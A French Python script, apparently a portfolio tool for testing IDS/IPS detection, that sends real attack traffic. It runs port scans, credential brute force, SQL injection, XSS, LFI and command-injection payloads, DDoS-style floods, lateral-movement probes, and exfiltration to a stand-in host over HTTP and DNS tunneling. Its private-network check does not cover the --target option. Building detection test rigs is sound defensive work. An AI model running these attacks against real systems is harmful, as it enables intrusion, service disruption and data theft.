#!/usr/bin/env python3
"""
Générateur de Trafic Malveillant - Tests IDS/IPS
Projet 04 - Cybersecurity Portfolio

Fonctionnalités:
- Génération de différents types d'attaques
- Tests de détection Suricata/Snort
- Simulation de scénarios d'attaque réalistes
- Validation de l'efficacité des règles de détection
- Métriques de performance IDS/IPS

⚠️ UTILISATION EXCLUSIVE EN ENVIRONNEMENT DE TEST ⚠️
"""

import socket
import time
import random
import argparse
import threading
import subprocess
import logging
from datetime import datetime
from pathlib import Path
from typing import List, Dict, Any, Optional
import json
import requests
from urllib.parse import urlencode

# Configuration logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class MaliciousTrafficGenerator:
    def __init__(self, target_network: str = "192.168.100.0/24", rate_limit: int = 10):
        """
        Initialisation du générateur de trafic malveillant
        
        Args:
            target_network: Réseau cible pour les tests
            rate_limit: Limitation du taux d'attaque (req/sec)
        """
        self.target_network = target_network
        self.rate_limit = rate_limit
        self.running = False
        self.results = {
            'attacks_sent': 0,
            'responses_received': 0,
            'errors': 0,
            'start_time': None
        }
        
        # Configuration des cibles de test
        self.targets = self._parse_target_network(target_network)
        
        logger.info(f"🎯 Générateur initialisé - Cibles: {len(self.targets)}")

    def _parse_target_network(self, network: str) -> List[str]:
        """Parse réseau cible et génère liste d'IPs"""
        import ipaddress
        
        try:
            network_obj = ipaddress.ip_network(network, strict=False)
            # Limiter à 10 IPs pour éviter le spam
            return [str(ip) for ip in list(network_obj.hosts())[:10]]
        except Exception as e:
            logger.warning(f"Erreur parsing réseau: {e}. Utilisation IP par défaut.")
            return ["192.168.100.10", "192.168.100.20"]

    def generate_port_scan(self, target_ip: str, port_range: tuple = (1, 1024), 
                          scan_type: str = "tcp") -> Dict[str, Any]:
        """
        Génération scan de ports
        
        Args:
            target_ip: IP cible
            port_range: Range de ports à scanner
            scan_type: Type de scan (tcp, udp, syn)
        """
        logger.info(f"🔍 Port scan vers {target_ip} - Ports {port_range[0]}-{port_range[1]}")
        
        results = {
            'attack_type': 'port_scan',
            'target': target_ip,
            'timestamp': datetime.now().isoformat(),
            'ports_scanned': [],
            'open_ports': [],
            'closed_ports': []
        }
        
        start_port, end_port = port_range
        ports_to_scan = list(range(start_port, min(end_port + 1, start_port + 50)))  # Limiter à 50 ports
        
        for port in ports_to_scan:
            try:
                if scan_type == "tcp":
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.1)
                    result = sock.connect_ex((target_ip, port))
                    
                    if result == 0:
                        results['open_ports'].append(port)
                        logger.debug(f"   Port {port}/tcp ouvert")
                    else:
                        results['closed_ports'].append(port)
                    
                    sock.close()
                    
                elif scan_type == "udp":
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.settimeout(0.1)
                    try:
                        sock.sendto(b"test", (target_ip, port))
                        results['open_ports'].append(port)
                    except:
                        results['closed_ports'].append(port)
                    sock.close()
                
                results['ports_scanned'].append(port)
                self.results['attacks_sent'] += 1
                
                # Rate limiting
                time.sleep(1.0 / self.rate_limit)
                
            except Exception as e:
                logger.debug(f"Erreur scan port {port}: {e}")
                self.results['errors'] += 1
        
        logger.info(f"   📊 {len(results['open_ports'])} ports ouverts détectés")
        return results

    def generate_brute_force(self, target_ip: str, service: str = "ssh", 
                           duration: int = 60) -> Dict[str, Any]:
        """
        Génération attaque brute force
        
        Args:
            target_ip: IP cible
            service: Service ciblé (ssh, http, ftp)
            duration: Durée de l'attaque en secondes
        """
        logger.info(f"🔓 Brute force {service} vers {target_ip} pendant {duration}s")
        
        results = {
            'attack_type': 'brute_force',
            'target': target_ip,
            'service': service,
            'timestamp': datetime.now().isoformat(),
            'attempts': 0,
            'successful_attempts': 0,
            'duration': duration
        }
        
        # Dictionnaires de mots de passe communs
        common_passwords = [
            "admin", "password", "123456", "root", "administrator",
            "user", "guest", "test", "demo", "default"
        ]
        
        common_usernames = [
            "admin", "root", "administrator", "user", "guest",
            "test", "demo", "sa", "postgres", "mysql"
        ]
        
        start_time = time.time()
        port_map = {"ssh": 22, "http": 80, "https": 443, "ftp": 21, "telnet": 23}
        target_port = port_map.get(service, 22)
        
        while time.time() - start_time < duration and self.running:
            username = random.choice(common_usernames)
            password = random.choice(common_passwords)
            
            try:
                if service == "ssh":
                    self._attempt_ssh_login(target_ip, target_port, username, password)
                elif service in ["http", "https"]:
                    self._attempt_http_login(target_ip, target_port, username, password, service)
                elif service == "ftp":
                    self._attempt_ftp_login(target_ip, target_port, username, password)
                
                results['attempts'] += 1
                self.results['attacks_sent'] += 1
                
                # Rate limiting
                time.sleep(1.0 / self.rate_limit)
                
            except Exception as e:
                logger.debug(f"Erreur tentative {service}: {e}")
                self.results['errors'] += 1
        
        logger.info(f"   📊 {results['attempts']} tentatives de connexion")
        return results

    def _attempt_ssh_login(self, target_ip: str, port: int, username: str, password: str):
        """Tentative de connexion SSH"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2.0)
        try:
            sock.connect((target_ip, port))
            # Simulation handshake SSH simplifié
            banner = sock.recv(1024)
            if b"SSH" in banner:
                # Envoi tentative d'auth (simulation)
                auth_attempt = f"SSH_AUTH:{username}:{password}\n".encode()
                sock.send(auth_attempt)
                sock.recv(1024)  # Réponse (probablement échec)
        finally:
            sock.close()

    def _attempt_http_login(self, target_ip: str, port: int, username: str, password: str, scheme: str):
        """Tentative de connexion HTTP"""
        url = f"{scheme}://{target_ip}:{port}/login"
        data = {
            'username': username,
            'password': password,
            'login': 'Login'
        }
        
        try:
            response = requests.post(url, data=data, timeout=2, verify=False)
            if response.status_code in [200, 401, 403]:
                self.results['responses_received'] += 1
        except requests.exceptions.RequestException:
            pass  # Connexion échouée, normal pour les tests

    def _attempt_ftp_login(self, target_ip: str, port: int, username: str, password: str):
        """Tentative de connexion FTP"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2.0)
        try:
            sock.connect((target_ip, port))
            # Réception banner FTP
            banner = sock.recv(1024)
            if b"220" in banner or b"FTP" in banner:
                # Envoi commandes FTP
                sock.send(f"USER {username}\r\n".encode())
                sock.recv(1024)
                sock.send(f"PASS {password}\r\n".encode())
                sock.recv(1024)
        finally:
            sock.close()

    def generate_web_attacks(self, target_ip: str, port: int = 80, 
                           attack_types: List[str] = None) -> Dict[str, Any]:
        """
        Génération d'attaques web
        
        Args:
            target_ip: IP cible
            port: Port du serveur web
            attack_types: Types d'attaques (sql_injection, xss, lfi, etc.)
        """
        if attack_types is None:
            attack_types = ["sql_injection", "xss", "lfi", "command_injection"]
        
        logger.info(f"🌐 Attaques web vers {target_ip}:{port}")
        
        results = {
            'attack_type': 'web_attacks',
            'target': f"{target_ip}:{port}",
            'timestamp': datetime.now().isoformat(),
            'attacks_attempted': {},
            'responses': []
        }
        
        base_url = f"http://{target_ip}:{port}"
        
        for attack_type in attack_types:
            results['attacks_attempted'][attack_type] = 0
            payloads = self._get_web_attack_payloads(attack_type)
            
            for payload in payloads[:5]:  # Limiter à 5 payloads par type
                try:
                    if attack_type in ["sql_injection", "xss"]:
                        # Test sur paramètre GET
                        url = f"{base_url}/search?q={payload}"
                        response = requests.get(url, timeout=3, verify=False)
                        
                        # Test sur paramètre POST
                        post_data = {"username": payload, "password": "test"}
                        response2 = requests.post(f"{base_url}/login", data=post_data, timeout=3, verify=False)
                        
                        results['responses'].extend([
                            {"url": url, "status": response.status_code, "attack": attack_type},
                            {"url": f"{base_url}/login", "status": response2.status_code, "attack": attack_type}
                        ])
                        
                    elif attack_type == "lfi":
                        url = f"{base_url}/page?file={payload}"
                        response = requests.get(url, timeout=3, verify=False)
                        results['responses'].append({
                            "url": url, "status": response.status_code, "attack": attack_type
                        })
                    
                    results['attacks_attempted'][attack_type] += 1
                    self.results['attacks_sent'] += 1
                    self.results['responses_received'] += 1
                    
                    # Rate limiting
                    time.sleep(1.0 / self.rate_limit)
                    
                except Exception as e:
                    logger.debug(f"Erreur attaque web: {e}")
                    self.results['errors'] += 1
        
        total_attacks = sum(results['attacks_attempted'].values())
        logger.info(f"   📊 {total_attacks} attaques web envoyées")
        return results

    def _get_web_attack_payloads(self, attack_type: str) -> List[str]:
        """Récupération des payloads d'attaque web"""
        payloads = {
            "sql_injection": [
                "' OR '1'='1",
                "' UNION SELECT NULL,NULL,NULL--",
                "admin'--",
                "' OR 1=1 LIMIT 1--",
                "; DROP TABLE users;--"
            ],
            "xss": [
                "<script>alert('XSS')</script>",
                "javascript:alert('XSS')",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "<iframe src=javascript:alert('XSS')>"
            ],
            "lfi": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "/var/log/apache2/access.log",
                "php://filter/read=convert.base64-encode/resource=index.php"
            ],
            "command_injection": [
                "; cat /etc/passwd",
                "| whoami",
                "&& dir",
                "; ls -la",
                "| type C:\\windows\\system32\\drivers\\etc\\hosts"
            ]
        }
        
        return payloads.get(attack_type, ["test_payload"])

    def generate_ddos_simulation(self, target_ip: str, port: int = 80, 
                                duration: int = 30, threads: int = 5) -> Dict[str, Any]:
        """
        Simulation d'attaque DDoS légère
        
        Args:
            target_ip: IP cible
            port: Port cible
            duration: Durée en secondes
            threads: Nombre de threads
        """
        logger.info(f"⚡ Simulation DDoS vers {target_ip}:{port} ({threads} threads, {duration}s)")
        
        results = {
            'attack_type': 'ddos_simulation',
            'target': f"{target_ip}:{port}",
            'timestamp': datetime.now().isoformat(),
            'threads': threads,
            'duration': duration,
            'total_requests': 0,
            'successful_requests': 0,
            'failed_requests': 0
        }
        
        def ddos_worker():
            """Worker thread pour simulation DDoS"""
            start_time = time.time()
            while time.time() - start_time < duration and self.running:
                try:
                    if port == 80 or port == 443:
                        # Attaque HTTP
                        scheme = "https" if port == 443 else "http"
                        url = f"{scheme}://{target_ip}:{port}/"
                        response = requests.get(url, timeout=1)
                        if response.status_code < 400:
                            results['successful_requests'] += 1
                    else:
                        # Attaque TCP générique
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(0.5)
                        result = sock.connect_ex((target_ip, port))
                        sock.close()
                        if result == 0:
                            results['successful_requests'] += 1
                    
                    results['total_requests'] += 1
                    self.results['attacks_sent'] += 1
                    
                except Exception:
                    results['failed_requests'] += 1
                    self.results['errors'] += 1
                
                # Rate limiting par thread
                time.sleep(1.0 / (self.rate_limit / threads))
        
        # Lancement des threads
        thread_list = []
        for i in range(threads):
            t = threading.Thread(target=ddos_worker)
            t.daemon = True
            t.start()
            thread_list.append(t)
        
        # Attente fin des threads
        for t in thread_list:
            t.join()
        
        logger.info(f"   📊 {results['total_requests']} requêtes envoyées")
        return results

    def generate_data_exfiltration(self, source_ip: str, target_ip: str, 
                                 data_size: int = 10485760) -> Dict[str, Any]:  # 10MB par défaut
        """
        Simulation d'exfiltration de données
        
        Args:
            source_ip: IP source (interne)
            target_ip: IP destination (externe)
            data_size: Taille des données à exfiltrer (bytes)
        """
        logger.info(f"📤 Simulation exfiltration {data_size} bytes: {source_ip} -> {target_ip}")
        
        results = {
            'attack_type': 'data_exfiltration',
            'source': source_ip,
            'target': target_ip,
            'timestamp': datetime.now().isoformat(),
            'data_size_bytes': data_size,
            'transfer_complete': False,
            'transfer_time': 0
        }
        
        try:
            # Simulation via HTTP POST
            start_time = time.time()
            
            # Génération de données fictives
            chunk_size = 1024 * 1024  # 1MB chunks
            chunks_sent = 0
            total_chunks = data_size // chunk_size
            
            for i in range(min(total_chunks, 10)):  # Limiter à 10MB max
                fake_data = b'A' * min(chunk_size, data_size - (chunks_sent * chunk_size))
                
                try:
                    # Simulation envoi via différents protocoles
                    protocols = ['http', 'ftp', 'dns']
                    protocol = random.choice(protocols)
                    
                    if protocol == 'http':
                        url = f"http://{target_ip}/upload.php"
                        files = {'file': ('data.txt', fake_data)}
                        response = requests.post(url, files=files, timeout=5)
                    elif protocol == 'ftp':
                        # Simulation FTP upload
                        self._simulate_ftp_upload(target_ip, fake_data)
                    elif protocol == 'dns':
                        # Simulation DNS tunneling
                        self._simulate_dns_tunneling(target_ip, fake_data[:100])  # Petits chunks pour DNS
                    
                    chunks_sent += 1
                    self.results['attacks_sent'] += 1
                    
                except Exception as e:
                    logger.debug(f"Erreur exfiltration chunk {i}: {e}")
                    self.results['errors'] += 1
                
                # Rate limiting
                time.sleep(1.0 / self.rate_limit)
            
            results['transfer_time'] = time.time() - start_time
            results['transfer_complete'] = chunks_sent == total_chunks
            
        except Exception as e:
            logger.error(f"Erreur exfiltration: {e}")
            self.results['errors'] += 1
        
        logger.info(f"   📊 {chunks_sent} chunks transférés")
        return results

    def _simulate_ftp_upload(self, target_ip: str, data: bytes):
        """Simulation upload FTP"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2.0)
        try:
            sock.connect((target_ip, 21))
            # Simulation commandes FTP
            sock.recv(1024)  # Banner
            sock.send(b"USER anonymous\r\n")
            sock.recv(1024)
            sock.send(b"PASS guest@\r\n")
            sock.recv(1024)
            sock.send(b"STOR exfil_data.txt\r\n")
            sock.send(data[:1024])  # Simulation envoi partiel
        finally:
            sock.close()

    def _simulate_dns_tunneling(self, target_ip: str, data: bytes):
        """Simulation DNS tunneling"""
        # Encodage des données en base64 pour DNS
        import base64
        encoded_data = base64.b64encode(data).decode()[:50]  # Limiter taille
        
        # Simulation requête DNS avec données
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(1.0)
        try:
            query = f"{encoded_data}.exfil.malware.example.com"
            # Simulation requête DNS (simplifié)
            dns_query = f"DNS_QUERY:{query}".encode()
            sock.sendto(dns_query, (target_ip, 53))
            sock.recv(1024)
        except:
            pass
        finally:
            sock.close()

    def generate_lateral_movement(self, source_ip: str, internal_ips: List[str]) -> Dict[str, Any]:
        """
        Simulation de mouvement latéral
        
        Args:
            source_ip: IP source compromise
            internal_ips: Liste des IPs internes à cibler
        """
        logger.info(f"↔️ Simulation mouvement latéral depuis {source_ip}")
        
        results = {
            'attack_type': 'lateral_movement',
            'source': source_ip,
            'targets': internal_ips,
            'timestamp': datetime.now().isoformat(),
            'successful_connections': [],
            'failed_connections': [],
            'protocols_used': []
        }
        
        # Protocoles pour mouvement latéral
        protocols = [
            {'name': 'SMB', 'port': 445},
            {'name': 'RDP', 'port': 3389},
            {'name': 'WMI', 'port': 135},
            {'name': 'SSH', 'port': 22},
            {'name': 'WinRM', 'port': 5985}
        ]
        
        for target_ip in internal_ips[:5]:  # Limiter à 5 cibles
            for protocol in protocols:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1.0)
                    result = sock.connect_ex((target_ip, protocol['port']))
                    
                    if result == 0:
                        results['successful_connections'].append({
                            'target': target_ip,
                            'protocol': protocol['name'],
                            'port': protocol['port']
                        })
                        logger.debug(f"   ✅ {protocol['name']} vers {target_ip}:{protocol['port']}")
                        
                        # Simulation commandes spécifiques au protocole
                        if protocol['name'] == 'SMB':
                            sock.send(b"SMB_ENUM_SHARES")
                        elif protocol['name'] == 'WMI':
                            sock.send(b"WMI_QUERY_PROCESSES")
                    else:
                        results['failed_connections'].append({
                            'target': target_ip,
                            'protocol': protocol['name'],
                            'port': protocol['port']
                        })
                    
                    sock.close()
                    self.results['attacks_sent'] += 1
                    
                    if protocol['name'] not in results['protocols_used']:
                        results['protocols_used'].append(protocol['name'])
                    
                except Exception as e:
                    logger.debug(f"Erreur {protocol['name']} vers {target_ip}: {e}")
                    self.results['errors'] += 1
                
                # Rate limiting
                time.sleep(1.0 / self.rate_limit)
        
        successful_count = len(results['successful_connections'])
        logger.info(f"   📊 {successful_count} connexions latérales réussies")
        return results

    def run_attack_scenario(self, scenario: str, targets: List[str] = None, 
                          duration: int = 60) -> Dict[str, Any]:
        """
        Exécution d'un scénario d'attaque complet
        
        Args:
            scenario: Type de scénario (reconnaissance, breach, lateral, exfiltration)
            targets: Liste des cibles (utilise self.targets par défaut)
            duration: Durée du scénario
        """
        if targets is None:
            targets = self.targets[:3]  # Limiter à 3 cibles
        
        logger.info(f"🎬 Scénario d'attaque: {scenario} ({duration}s)")
        
        self.running = True
        self.results['start_time'] = datetime.now()
        scenario_results = {
            'scenario': scenario,
            'targets': targets,
            'duration': duration,
            'start_time': datetime.now().isoformat(),
            'attacks': [],
            'summary': {}
        }
        
        try:
            if scenario == "reconnaissance":
                # Phase 1: Reconnaissance
                for target in targets:
                    # Port scan
                    result = self.generate_port_scan(target, (1, 100))
                    scenario_results['attacks'].append(result)
                    
                    # Service enumeration
                    if result['open_ports']:
                        for port in result['open_ports'][:3]:  # Top 3 ports
                            service_result = self._enumerate_service(target, port)
                            scenario_results['attacks'].append(service_result)
            
            elif scenario == "breach":
                # Phase 2: Initial Access
                for target in targets:
                    # Brute force SSH
                    ssh_result = self.generate_brute_force(target, "ssh", 30)
                    scenario_results['attacks'].append(ssh_result)
                    
                    # Web attacks
                    web_result = self.generate_web_attacks(target, 80)
                    scenario_results['attacks'].append(web_result)
            
            elif scenario == "lateral":
                # Phase 3: Lateral Movement
                source_ip = targets[0]
                lateral_targets = targets[1:] + ["192.168.100.50", "192.168.100.60"]
                
                lateral_result = self.generate_lateral_movement(source_ip, lateral_targets)
                scenario_results['attacks'].append(lateral_result)
            
            elif scenario == "exfiltration":
                # Phase 4: Data Exfiltration
                internal_ip = "192.168.100.10"
                external_ip = "203.0.113.100"  # IP externe fictive
                
                exfil_result = self.generate_data_exfiltration(internal_ip, external_ip, 5242880)  # 5MB
                scenario_results['attacks'].append(exfil_result)
            
            elif scenario == "full_attack_chain":
                # Chaîne d'attaque complète
                target = targets[0]
                
                # 1. Reconnaissance
                recon = self.generate_port_scan(target, (1, 1024))
                scenario_results['attacks'].append(recon)
                
                time.sleep(2)
                
                # 2. Initial Access
                breach = self.generate_brute_force(target, "ssh", 30)
                scenario_results['attacks'].append(breach)
                
                time.sleep(2)
                
                # 3. Lateral Movement
                lateral = self.generate_lateral_movement(target, targets[1:])
                scenario_results['attacks'].append(lateral)
                
                time.sleep(2)
                
                # 4. Data Exfiltration
                exfil = self.generate_data_exfiltration(target, "203.0.113.100", 2097152)  # 2MB
                scenario_results['attacks'].append(exfil)
                
        except KeyboardInterrupt:
            logger.info("⚠️ Scénario interrompu par l'utilisateur")
        except Exception as e:
            logger.error(f"❌ Erreur scénario: {e}")
        finally:
            self.running = False
            scenario_results['end_time'] = datetime.now().isoformat()
            scenario_results['summary'] = self._generate_scenario_summary(scenario_results)
        
        return scenario_results

    def _enumerate_service(self, target_ip: str, port: int) -> Dict[str, Any]:
        """Énumération de service"""
        result = {
            'attack_type': 'service_enumeration',
            'target': target_ip,
            'port': port,
            'timestamp': datetime.now().isoformat(),
            'service_banner': None,
            'service_type': 'unknown'
        }
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2.0)
            sock.connect((target_ip, port))
            
            # Tentative récupération banner
            banner = sock.recv(1024).decode('utf-8', errors='ignore')
            result['service_banner'] = banner[:100]  # Limiter taille
            
            # Identification service basique
            if 'SSH' in banner:
                result['service_type'] = 'ssh'
            elif 'HTTP' in banner or 'html' in banner.lower():
                result['service_type'] = 'http'
            elif 'FTP' in banner:
                result['service_type'] = 'ftp'
            elif 'SMTP' in banner:
                result['service_type'] = 'smtp'
            
            sock.close()
            self.results['attacks_sent'] += 1
            
        except Exception as e:
            logger.debug(f"Erreur énumération service {target_ip}:{port}: {e}")
            self.results['errors'] += 1
        
        return result

    def _generate_scenario_summary(self, scenario_results: Dict[str, Any]) -> Dict[str, Any]:
        """Génération résumé du scénario"""
        attacks_by_type = {}
        total_attacks = len(scenario_results['attacks'])
        
        for attack in scenario_results['attacks']:
            attack_type = attack.get('attack_type', 'unknown')
            if attack_type not in attacks_by_type:
                attacks_by_type[attack_type] = 0
            attacks_by_type[attack_type] += 1
        
        return {
            'total_attacks': total_attacks,
            'attacks_by_type': attacks_by_type,
            'total_requests': self.results['attacks_sent'],
            'errors': self.results['errors'],
            'duration_seconds': (datetime.now() - self.results['start_time']).total_seconds() if self.results['start_time'] else 0
        }

    def save_results(self, results: Dict[str, Any], filename: str = None):
        """Sauvegarde des résultats"""
        if filename is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"malicious_traffic_results_{timestamp}.json"
        
        filepath = Path(filename)
        with open(filepath, 'w') as f:
            json.dump(results, f, indent=2, default=str)
        
        logger.info(f"💾 Résultats sauvegardés: {filepath}")

def main():
    parser = argparse.ArgumentParser(
        description="Générateur de trafic malveillant pour tests IDS/IPS",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Exemples d'utilisation:
  # Port scan simple
  python3 malicious-traffic-generator.py --attack port_scan --target 192.168.100.10
  
  # Scénario complet d'attaque
  python3 malicious-traffic-generator.py --scenario full_attack_chain --targets 192.168.100.10,192.168.100.20 --duration 120
  
  # Attaque brute force SSH
  python3 malicious-traffic-generator.py --attack brute_force --target 192.168.100.10 --service ssh --duration 60

⚠️ UTILISATION EXCLUSIVE EN ENVIRONNEMENT DE TEST ⚠️
        """
    )
    
    parser.add_argument('--attack', choices=['port_scan', 'brute_force', 'web_attacks', 'ddos', 'data_exfiltration', 'lateral_movement'],
                       help='Type d\'attaque à générer')
    parser.add_argument('--scenario', choices=['reconnaissance', 'breach', 'lateral', 'exfiltration', 'full_attack_chain'],
                       help='Scénario d\'attaque complet')
    parser.add_argument('--target', help='IP cible unique')
    parser.add_argument('--targets', help='Liste d\'IPs cibles séparées par virgules')
    parser.add_argument('--network', default='192.168.100.0/24', help='Réseau cible')
    parser.add_argument('--duration', type=int, default=60, help='Durée de l\'attaque en secondes')
    parser.add_argument('--rate-limit', type=int, default=10, help='Limitation taux (requêtes/sec)')
    parser.add_argument('--service', default='ssh', help='Service cible pour brute force')
    parser.add_argument('--port', type=int, default=80, help='Port cible')
    parser.add_argument('--threads', type=int, default=5, help='Nombre de threads pour DDoS')
    parser.add_argument('--output', help='Fichier de sortie pour les résultats')
    parser.add_argument('--verbose', '-v', action='store_true', help='Mode verbeux')
    
    args = parser.parse_args()
    
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    # Validation sécurité
    if args.network and not any(args.network.startswith(prefix) for prefix in ["192.168.", "10.", "172.16.", "127."]):
        logger.error("❌ Seuls les réseaux privés sont autorisés pour les tests")
        return 1
    
    # Initialisation générateur
    generator = MaliciousTrafficGenerator(args.network, args.rate_limit)
    
    # Préparation des cibles
    targets = []
    if args.target:
        targets = [args.target]
    elif args.targets:
        targets = args.targets.split(',')
    else:
        targets = generator.targets[:3]  # 3 cibles par défaut
    
    try:
        results = None
        
        if args.attack:
            generator.running = True
            generator.results['start_time'] = datetime.now()
            
            if args.attack == 'port_scan':
                results = generator.generate_port_scan(targets[0])
            elif args.attack == 'brute_force':
                results = generator.generate_brute_force(targets[0], args.service, args.duration)
            elif args.attack == 'web_attacks':
                results = generator.generate_web_attacks(targets[0], args.port)
            elif args.attack == 'ddos':
                results = generator.generate_ddos_simulation(targets[0], args.port, args.duration, args.threads)
            elif args.attack == 'data_exfiltration':
                if len(targets) >= 2:
                    results = generator.generate_data_exfiltration(targets[0], targets[1])
                else:
                    results = generator.generate_data_exfiltration(targets[0], "203.0.113.100")
            elif args.attack == 'lateral_movement':
                results = generator.generate_lateral_movement(targets[0], targets[1:])
                
        elif args.scenario:
            results = generator.run_attack_scenario(args.scenario, targets, args.duration)
        
        else:
            logger.error("❌ Spécifiez --attack ou --scenario")
            return 1
        
        # Affichage résultats
        if results:
            print("\n" + "="*60)
            print("📊 RÉSULTATS DE L'ATTAQUE")
            print("="*60)
            print(f"Type: {results.get('attack_type', results.get('scenario', 'Unknown'))}")
            print(f"Cible(s): {results.get('target', results.get('targets', 'Unknown'))}")
            print(f"Timestamp: {results.get('timestamp', results.get('start_time', 'Unknown'))}")
            
            if 'attacks' in results:
                print(f"Attaques générées: {len(results['attacks'])}")
                print(f"Résumé: {results.get('summary', {})}")
            
            print(f"\nStatistiques globales:")
            print(f"  Requêtes envoyées: {generator.results['attacks_sent']}")
            print(f"  Réponses reçues: {generator.results['responses_received']}")
            print(f"  Erreurs: {generator.results['errors']}")
            
            # Sauvegarde si demandé
            if args.output:
                generator.save_results(results, args.output)
            
    except KeyboardInterrupt:
        logger.info("⚠️ Génération interrompue par l'utilisateur")
    except Exception as e:
        logger.error(f"❌ Erreur génération: {e}")
        return 1
    
    return 0

if __name__ == "__main__":
    import sys
    
    print("⚠️" * 20)
    print("GÉNÉRATEUR DE TRAFIC MALVEILLANT")
    print("UTILISATION EXCLUSIVE EN ENVIRONNEMENT DE TEST")
    print("⚠️" * 20)
    
    sys.exit(main())